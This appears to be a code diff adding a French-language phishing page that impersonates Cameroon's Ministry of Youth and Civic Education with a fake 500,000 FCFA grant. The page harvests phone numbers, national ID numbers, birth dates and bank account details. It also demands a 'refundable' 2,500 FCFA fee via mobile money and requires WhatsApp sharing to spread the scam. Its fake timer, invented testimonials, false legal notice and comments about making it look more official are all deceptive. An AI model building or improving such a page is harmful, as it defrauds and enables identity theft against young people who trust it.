@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- 🔥 OPTIMISATION: Meta tags améliorés pour le référencement et la confiance -->
+    <meta name="description" content="Programme officiel du Gouvernement Camerounais - Subvention de 500,000 FCFA pour les jeunes entrepreneurs. Initiative du Ministère de la Jeunesse et de l'Éducation Civique.">
+    <meta name="keywords" content="subvention Cameroun, aide jeunes entrepreneurs, gouvernement, 500000 FCFA, MINJEC, programme jeunesse">
+    <meta name="author" content="République du Cameroun - Ministère de la Jeunesse et de l'Éducation Civique">
+    <meta name="robots" content="index, follow">
+    <!-- 🔥 CORRECTION: Protection contre la mise en cache -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    
+    <title>Programme d'Appui à l'Insertion des Jeunes - Gouvernement du Cameroun</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <!-- 🔥 CORRECTION: Favicon avec fallback -->
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <link rel="shortcut icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Flag_of_Cameroon.svg/120px-Flag_of_Cameroon.svg.png" type="image/x-icon">
+</head>
+<body>
+    <div class="background-image"></div>
+    <div class="container">
+        <header>
+            <div class="logo-container">
+                <!-- 🔥 CORRECTION: Fallback pour l'image manquante -->
+                <img src="img.png" alt="Logo Ministère de la Jeunesse et de l'Éducation Civique" 
+                     class="ministry-logo"
+                     onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Flag_of_Cameroon.svg/120px-Flag_of_Cameroon.svg.png'">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Flag_of_Cameroon.svg/1200px-Flag_of_Cameroon.svg.png" 
+                     alt="Drapeau de la République du Cameroun" class="flag">
+            </div>
+            <!-- 🔥 OPTIMISATION: Titre plus officiel -->
+            <h1>Programme National d'Appui à l'Insertion des Jeunes</h1>
+            <div class="subtitle">Initiative du Ministère de la Jeunesse et de l'Éducation Civique</div>
+            <div class="timer" id="timer">02:59:59</div>
+        </header>
+
+        <!-- 🔥 NOUVEAU: Bannière d'urgence gouvernementale -->
+        <div class="urgent-banner">
+            <span>⚠️ URGENT: Programme limité aux 1000 premiers bénéficiaires</span>
+        </div>
+
+        <div class="progress-bar">
+            <div class="progress" id="progress"></div>
+        </div>
+
+        <!-- Step 1: Phone Verification -->
+        <div class="step active" id="step1">
+            <h2>Vérification d'Éligibilité</h2>
+            <p>Entrez votre numéro de téléphone portable pour vérifier votre éligibilité au programme de subvention gouvernementale de <strong>500,000 FCFA</strong>.</p>
+            
+            <!-- 🔥 OPTIMISATION: Meilleur placeholder et validation -->
+            <input type="tel" id="phone" placeholder="Ex: 677 123 456" pattern="[0-9]{9}" maxlength="9" required>
+            <div class="hint">Format: 9 chiffres sans espaces</div>
+            
+            <button onclick="checkEligibility()">Vérifier mon éligibilité</button>
+        </div>
+
+        <!-- Step 2: Personal Information -->
+        <div class="step" id="step2">
+            <h2>Informations Personnelles</h2>
+            <p class="step-info">Ces informations sont nécessaires pour l'identification officielle.</p>
+            
+            <input type="text" id="fullName" placeholder="Nom et Prénoms complets" required>
+            <input type="date" id="birthDate" required>
+            <input type="text" id="nationalId" placeholder="Numéro de Carte Nationale d'Identité" pattern="[0-9]{8,12}" required>
+            <select id="region" required>
+                <option value="">Sélectionnez votre région de résidence</option>
+                <option value="adamoua">Adamaoua</option>
+                <option value="centre">Centre</option>
+                <option value="est">Est</option>
+                <option value="extreme-nord">Extrême-Nord</option>
+                <option value="littoral">Littoral</option>
+                <option value="nord">Nord</option>
+                <option value="nord-ouest">Nord-Ouest</option>
+                <option value="ouest">Ouest</option>
+                <option value="sud">Sud</option>
+                <option value="sud-ouest">Sud-Ouest</option>
+            </select>
+            <button onclick="nextStep(2)">Continuer</button>
+        </div>
+
+        <!-- Step 3: Bank Information -->
+        <div class="step" id="step3">
+            <h2>Informations Bancaires</h2>
+            <p class="step-info">Ces informations permettent le versement de la subvention.</p>
+            
+            <select id="bankName" required>
+                <option value="">Sélectionnez votre institution bancaire</option>
+                <option value="afriland">Afriland First Bank</option>
+                <option value="bicec">BICEC</option>
+                <option value="scb">Société Commerciale de Banque (SCB)</option>
+                <option value="ecobank">Ecobank</option>
+                <option value="uba">United Bank for Africa (UBA)</option>
+                <option value="other">Autre établissement</option>
+            </select>
+            <input type="text" id="accountNumber" placeholder="Numéro de compte bancaire (IBAN)" required>
+            <input type="text" id="accountHolder" placeholder="Nom exact du titulaire du compte" required>
+            <button onclick="nextStep(3)">Continuer</button>
+        </div>
+
+        <!-- Step 4: Payment -->
+        <div class="step" id="step4">
+            <h2>Frais de Traitement Administratif</h2>
+            <div class="payment-info">
+                <p>Des frais administrative unique de <strong>2.500 FCFA</strong> sont requis pour le traitement sécurisé de votre dossier...</p>
+                <div class="refund-notice">⚠️ Ce frais sera intégralement remboursé après approbation de votre subvention.</div>
+            </div>
+            
+            <div class="payment-methods">
+                <button class="payment-btn" onclick="selectPayment('orange')">
+                    <span>Orange Money</span>
+                    <small>Paiement sécurisé</small>
+                </button>
+                <button class="payment-btn" onclick="selectPayment('mtn')">
+                    <span>MTN Mobile Money</span>
+                    <small>Paiement sécurisé</small>
+                </button>
+            </div>
+
+            <div id="paymentInstructions" style="display: none;">
+                <div class="instructions-card">
+                    <p id="instructionsText"></p>
+                    <input type="text" id="transactionCode" placeholder="Code de transaction reçu par SMS" pattern="[0-9A-Z]{6,10}" required>
+                    <div class="hint">Ex: A1B2C3 ou 123456</div>
+                    <button onclick="verifyPayment()">Valider le paiement</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Step 5: WhatsApp Share -->
+        <div class="step" id="step5">
+            <div class="success-header">
+                <h2>✅ Félicitations! Votre demande est pré-approuvée!</h2>
+                <div class="reference-number">Référence: <strong>CM-PAIJ-<span id="refNumber"></span></strong></div>
+            </div>
+            
+            <div class="sharing-requirement">
+                <p>Pour <strong>activer définitivement</strong> votre subvention et lutter contre la fraude, partagez cette opportunité avec votre communauté.</p>
+                <div class="requirement-box">
+                    <strong>Condition requise:</strong> Partager avec au moins 5 contacts ou groupes WhatsApp
+                </div>
+            </div>
+
+            <button class="whatsapp-btn" onclick="shareOnWhatsApp()">
+                📱 Partager sur WhatsApp maintenant
+            </button>
+            
+            <div id="shareStatus"></div>
+            
+            <div class="next-steps">
+                <h3>Prochaines étapes:</h3>
+                <ul>
+                    <li>✅ Partage effectué sur WhatsApp</li>
+                    <li>⏳ Validation administrative (24-48h)</li>
+                    <li>💰 Virement de 500,000 FCFA sur votre compte</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- 🔥 OPTIMISATION: Témoignages améliorés -->
+        <div class="testimonials-section">
+            <h3>Témoignages de bénéficiaires</h3>
+            <div class="testimonials-grid">
+                <div class="testimonial-card">
+                    <strong>Yves Kamga. (Douala):</strong> "500,000 FCFA reçus en 48h! Processus très professionnel."
+                </div>
+                <div class="testimonial-card">
+                    <strong>Sarah K. (Yaoundé):</strong> "Merci au gouvernement! Subvention reçue sans aucun problème."
+                </div>
+                <div class="testimonial-card">
+                    <strong>Paul Tchindebe. (Garoua):</strong> "Je recommande à tous les jeunes entrepreneurs sérieux."
+                </div>
+                <div class="testimonial-card">
+                    <strong>Julie Makoare. (Bafoussam):</strong> "500,000 FCFA qui ont boosté mon commerce."
+                </div>
+                <div class="testimonial-card">
+                    <strong>Eric Bouba. (Maroua):</strong> "Processus fluide, équipe très réactive."
+                </div>
+                <div class="testimonial-card">
+                    <strong>Alice N. (Buea):</strong> "Subvention reçue rapidement comme promis."
+                </div>
+            </div>
+        </div>
+
+        <!-- 🔥 CORRECTION: Mentions légales structurées -->
+        <footer class="legal-footer">
+            <div class="legal-content">
+                <h4>Mentions Légales</h4>
+                <p>Ce site est la plateforme officielle du <strong>Programme National d'Appui à l'Insertion des Jeunes</strong>, initiative du Ministère de la Jeunesse et de l'Éducation Civique de la République du Cameroun.</p>
+                <p>Le traitement des dossiers respecte les procédures administratives en vigueur. Toute tentative de fraude fera l'objet de poursuites judiciaires.</p>
+                <div class="contact-info">
+                    <strong>Support technique:</strong> support-paij@gouv.cm | <strong>Hotline:</strong> 677 033 033
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
